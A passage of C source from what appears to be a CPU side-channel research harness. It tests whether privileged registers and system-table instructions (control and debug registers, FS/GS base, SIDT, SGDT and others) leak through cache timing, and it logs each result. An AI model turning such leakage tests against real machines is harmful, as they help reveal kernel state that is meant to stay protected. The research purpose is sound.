  if (CHECK(test_cr4(2000, 4096, 5))) {
    log_success("CR4 leakage verified!");
  } else {
    log_warning("CR4 leakage not verified!");
  }

  if (CHECK(test_cr5(2000, 4096, 5))) {
    log_success("CR5 leakage verified!");
  } else {
    log_warning("CR5 leakage not verified!");
  }

  if (CHECK(test_cr6(2000, 4096, 5))) {
    log_success("CR6 leakage verified!");
  } else {
    log_warning("CR6 leakage not verified!");
  }

  if (CHECK(test_cr7(2000, 4096, 5))) {
    log_success("CR7 leakage verified!");
  } else {
    log_warning("CR7 leakage not verified!");
  }

  if (CHECK(test_cr8(2000, 4096, 5))) {
    log_success("CR8 leakage verified!");
  } else {
    log_warning("CR8 leakage not verified!");
  }

  if (CHECK(test_dr0(2000, 4096, 5))) {
    log_success("DR0 leakage verified!");
  } else {
    log_warning("DR0 leakage not verified!");
  }
  if (CHECK(test_dr1(2000, 4096, 5))) {
    log_success("DR1 leakage verified!");
  } else {
    log_warning("DR1 leakage not verified!");
  }
  if (CHECK(test_dr2(2000, 4096, 5))) {
    log_success("DR2 leakage verified!");
  } else {
    log_warning("DR2 leakage not verified!");
  }
  if (CHECK(test_dr3(2000, 4096, 5))) {
    log_success("DR3 leakage verified!");
  } else {
    log_warning("DR3 leakage not verified!");
  }
  if (CHECK(test_dr4(2000, 4096, 5))) {
    log_success("DR4 leakage verified!");
  } else {
    log_warning("DR4 leakage not verified!");
  }
  if (CHECK(test_dr5(2000, 4096, 5))) {
    log_success("DR5 leakage verified!");
  } else {
    log_warning("DR5 leakage not verified!");
  }
  if (CHECK(test_dr6(2000, 4096, 5))) {
    log_success("DR6 leakage verified!");
  } else {
    log_warning("DR6 leakage not verified!");
  }
  if (CHECK(test_dr7(2000, 4096, 5))) {
    log_success("DR7 leakage verified!");
  } else {
    log_warning("DR7 leakage not verified!");
  }

#ifdef TEST_RDFSBASE

  // FSBASE is *sometimes* 0 so we just let it point to some addr to see leakage
  // this can crash machines so it is disabled at the moment
  //printf("setting FSBASE to %p\n", unused_array);
  //syscall(SYS_arch_prctl, ARCH_SET_FS, unused_array); 

  if (CHECK(test_rdfsbase(2000, 4096, 5))) {
    log_success("RDFSBASE leakage verified!");
  } else {
    log_warning("RDFSBASE leakage not verified!");
  }

  // GSBASE is mostly 0 so we just let it point so some addr to see leakage
  printf("setting GSBASE to %p\n", unused_array);
  int ret = syscall(SYS_arch_prctl, ARCH_SET_GS, unused_array); 
  printf("ret: %d (errno: %s)\n", ret, strerror(errno));

  if (CHECK(test_rdgsbase(2000, 4096, 5))) {
    log_success("RDGSBASE leakage verified!");
  } else {
    log_warning("RDGSBASE leakage not verified!");
  }

#endif

  size_t old_cache_miss = CACHE_MISS;
  CACHE_MISS = 3.0/4.0 * CACHE_MISS;
  printf("temporary CACHE_MISS: %zu\n", CACHE_MISS);

  // ================
  // store operations
  // ================
  if (CHECK(test_str(2000, 4096, 5))) {
    log_success("STR leakage verified!");
  } else {
    log_warning("STR leakage not verified!");
  }

  if (CHECK(test_sidt(2000, 4096, 5))) {
    log_success("SIDT leakage verified!");
  } else {
    log_warning("SIDT leakage not verified!");
  }
  CACHE_MISS = old_cache_miss;
  printf("set CACHE_MISS back to %zu\n", CACHE_MISS);

  if (CHECK(test_sldt(2000, 4096, 5))) {
    log_success("SLDT leakage verified!");
  } else {
    log_warning("SLDT leakage not verified!");
  }

  if (CHECK(test_sgdt(2000, 4096, 5))) {
    log_success("SGDT leakage verified!");
  } else {
    log_warning("SGDT leakage not verified!");
  }

  if (CHECK(test_smsw(2000, 4096, 5))) {
    log_success("SMSW leakage verified!");
  } else {
    log_warning("SMSW leakage not verified!");
  }

  // ======================
  // store operations (end)
  // ======================

  if (is_intel_cpu()) {
    enable_prefetchers();
    enable_turbo_boost();
  }

  return 0;
}
